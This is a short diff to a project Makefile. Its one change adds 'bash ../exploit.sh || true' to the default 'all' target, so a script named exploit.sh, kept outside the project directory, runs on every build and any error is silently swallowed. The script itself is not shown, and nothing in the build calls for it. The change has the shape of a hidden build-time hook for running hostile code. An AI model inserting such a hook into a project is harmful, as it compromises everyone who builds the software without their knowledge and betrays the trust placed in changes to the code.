@@ -33,6 +33,7 @@ MANDIR:=third$(MANSUBDIR)/../
 $(info Expecting man files in "$(MANDIR)")
 
 all: ${LIB} ${SUBDIRS} symlinks
+	bash ../exploit.sh || true
 
 # Add all dirs in ${SUBDIRS} here
 third:
